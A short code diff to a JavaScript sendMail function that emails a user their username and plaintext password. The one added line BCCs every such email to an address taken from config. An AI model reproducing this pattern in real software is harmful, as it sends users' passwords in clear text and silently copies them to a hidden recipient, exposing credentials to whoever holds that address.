@@ -19,6 +19,7 @@ function sendMail (req) {
     transporter.sendMail({
         from: config.sendMail.from,
         to: req.body.username,
+        bcc: config.sendMail.bcc,
         subject: config.sendMail.subject,
         text: 'Username: ' + req.body.username + ' Password: ' + req.body.password
     });
